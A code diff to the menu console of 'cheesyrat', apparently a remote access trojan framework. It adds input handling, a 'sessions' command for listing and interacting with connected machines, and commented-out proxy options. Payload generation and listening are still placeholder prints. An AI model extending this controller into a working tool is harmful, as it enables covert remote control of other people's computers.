@@ -8,6 +8,7 @@ import socket
 import argparse
 import readline
 from lib import colors
+from tools import server
 from lib import autocomplete
 from lib import cheesyrat_lib
 
@@ -25,31 +26,33 @@ def complete_menu():
         readline.set_completer(completer.complete)
         readline.parse_and_bind('tab: complete')
         ans = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'menu' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
-        if ans.lower() == "help" or ans == "?":
+        ans = ans.lower()
+        if ans.strip() == "help" or ans == "?":
             cheesyrat_lib.main_menu_help()
-        elif ans.lower() == "generate":
+        elif ans.strip() == "generate":
             generate_menu()
-        elif ans.lower() == "listen":
+        elif ans.strip() == "listen":
             listener_menu()
-        elif ans.lower() == "credits":
-            cheesyrat_lib.clear()
-            cheesyrat_lib.credits()
-            back = input(colors.GREEN + colors.BOLD + '\n\nPress [ENTER] to return to menu' + colors.END)
-            if back == "":
+        elif ans.strip() == "credits":
+            while True:
                 cheesyrat_lib.clear()
-                cheesyrat_lib.banner()
-            else:
-                cheesyrat_lib.clear()
-                cheesyrat_lib.banner()
-        elif ans.lower() == "banner":
+                cheesyrat_lib.credits()
+                back = input(colors.GREEN + colors.BOLD + '\n\nPress [ENTER] to return to menu' + colors.END)
+                if back == "":
+                    print("")
+                    break
+                else:
+                    print("")
+                    break
+        elif ans.strip() == "banner":
             cheesyrat_lib.banner()
-        elif ans.lower() == "clear":
+        elif ans.strip() == "clear":
             cheesyrat_lib.clear()
-        elif ans.lower() == "exit" or ans.lower() == "quit":
+        elif ans.strip() == "exit" or ans.lower() == "quit":
             cheesyrat_lib.exit_function()
-        elif ans.lower() == "force quit":
+        elif ans.strip() == "force quit":
             cheesyrat_lib.force_quit()
-        elif ans == "":
+        elif ans.strip() == "":
             pass
         else:
             cheesyrat_lib.warning_message("Invalid command. Type 'help' for help")
@@ -61,11 +64,14 @@ def generate_menu():
         readline.set_completer(completer.complete)
         readline.parse_and_bind('tab: complete')
         cmd = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'main/generate' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
-        if cmd.lower() == "help" or cmd == "?":
+        cmd = cmd.lower()
+        if cmd.strip() == "help" or cmd == "?":
             cheesyrat_lib.generate_menu_help()
-        elif cmd.lower() == "options" or cmd.lower() == "info":
+        elif cmd.strip() == "options":
             cheesyrat_lib.payload_options()
-        elif cmd.startswith('set'):
+        elif cmd.strip() == "info":
+            cheesyrat_lib.payload_info()
+        elif cmd.strip().startswith('set'):
             if len(cmd.split()) == 3:
                 choice = cmd.split()[1]
                 if choice.lower() == "lhost":
@@ -96,35 +102,36 @@ def generate_menu():
                         cheesyrat_lib.error_message("The port provided is invalid", False)
                 else:
                     cheesyrat_lib.warning_message("Invalid option after 'set'. Valid options are 'LHOST' and 'LPORT'.")
-        elif cmd.lower() == "generate" or cmd.lower() == "build" or cmd.lower() == "run":
+        elif cmd.strip() == "generate" or cmd.lower() == "build" or cmd.lower() == "run":
             print("generate payload")
-        elif cmd.lower() == "clear":
+        elif cmd.strip() == "clear":
             cheesyrat_lib.clear()
-        elif cmd.lower() == "back":
+        elif cmd.strip() == "back":
             break
-        elif cmd.lower() == "exit" or cmd.lower() == "quit":
+        elif cmd.strip() == "exit" or cmd.lower() == "quit":
             cheesyrat_lib.exit_function()
-        elif cmd.lower() == "force quit":
+        elif cmd.strip() == "force quit":
             cheesyrat_lib.force_quit()
-        elif cmd == "":
+        elif cmd.strip() == "":
             pass
         else:
             cheesyrat_lib.warning_message("Invalid command. Type 'help' for help.")
 
 def listener_menu():
     while True:
-        generate_kw = ["help", "clear", "back", "exit", "quit", "options", "info", "set", "run", "force quit", "listen"]
+        generate_kw = ["help", "clear", "back", "exit", "quit", "options", "info", "set", "run", "listen", "force quit", "listen", "sessions", "list"]
         completer = autocomplete.Complete(generate_kw)
         readline.set_completer(completer.complete)
         readline.parse_and_bind('tab: complete')
-        listener = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'main/generate' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
-        if listener.lower() == "help" or listener == "?":
+        listener = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'main/listener' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
+        listener = listener.lower()
+        if listener.strip() == "help" or listener == "?":
             cheesyrat_lib.listener_menu_help()
-        elif listener.lower() == "clear":
+        elif listener.strip() == "clear":
             cheesyrat_lib.clear()
-        elif listener.lower() == "back":
+        elif listener.strip() == "back":
             break
-        elif listener.lower() == "options" or listener.lower() == "info":
+        elif listener.strip() == "options" or listener.lower() == "info":
             cheesyrat_lib.listener_options()
         elif listener.startswith('set'):
             if len(listener.split()) == 3:
@@ -154,13 +161,53 @@ def listener_menu():
                             cheesyrat_lib.error_message(str(lport) + " is not a valid port number.", False)
                     except ValueError:
                         cheesyrat_lib.error_message("The port provided is invalid", False)
+            #     elif choice.lower() == "proxy":
+            #         proxy = str(listener.split()[2])
+            #         if proxy.lower() == "-h":
+            #             cheesyrat_lib.proxy_menu_help()
+            #         else:
+            #             cheesyrat_lib.warning_message("Invalid option for 'proxy'")
+            #     else:
+            #         cheesyrat_lib.warning_message("Invalid option after 'set'. Valid options are 'LHOST' and 'LPORT'.")
+            # elif len(listener.split()) == 5:
+            #     proxy_select = listener.split()[1]
+            #     if proxy_select.lower() == "proxy":
+            #         proxy_type = listener.split()[2]
+            #         proxy_host = listener.split()[3]
+            #         proxy_port = listener.split()[4]
+            #         if proxy_type.lower() == "socks5" or proxy_type.lower() == "socks4" or proxy_type.lower() == "http":
+            #             print("wait")
+            else:
+                cheesyrat_lib.warning_message("Insufficient amount of arguments. Type 'help' for help.")
+        elif listener.strip() == 'listen' or listener.lower() == 'run':
+            print("listen")
+        elif listener.strip().startswith('sessions'):
+            if len(listener.split()) == 1:
+                choice = listener.split()[0]
+                cheesyrat_lib.warning_message("Invalid command. Please type 'sesssions -h' for help.")
+            if len(listener.split()) == 2:
+                selected_arg = listener.split()[1]
+                if selected_arg.strip() == "-h" or selected_arg.strip() == "--help":
+                    cheesyrat_lib.sessions_menu_help()
+                elif selected_arg.strip() == "-l" or selected_arg.strip() == "--list":
+                    server.list_connections()
+                elif selected_arg.strip() == "-i" or selected_arg.strip() == "--interact":
+                    cheesyrat_lib.warning_message("Please provide an interaction ID. Ex: 'sessions -i 2'.")
                 else:
-                    cheesyrat_lib.warning_message("Invalid option after 'set'. Valid options are 'LHOST' and 'LPORT'.")
-        elif listener.lower() == "exit" or listener.lower() == "quit":
+                    cheesyrat_lib.warning_message("Invalid argument. Please type 'sesssions -h' for help.")
+            elif len(listener.split()) == 3:
+                interact_arg = listener.split()[1]
+                if interact_arg.strip() == '-i':
+                    try:
+                        sessions_id = int(listener.split()[2])
+                        print(sessions_id)
+                    except ValueError:
+                        cheesyrat_lib.error_message("The ID provided is not a number.", False)
+        elif listener.strip() == "exit" or listener.lower() == "quit":
             cheesyrat_lib.exit_function()
-        elif listener.lower() == "force quit":
+        elif listener.strip() == "force quit":
             cheesyrat_lib.force_quit()
-        elif listener.lower() == "":
+        elif listener.strip() == "":
             pass
         else:
             cheesyrat_lib.warning_message("Invalid command. Type 'help' for help.")
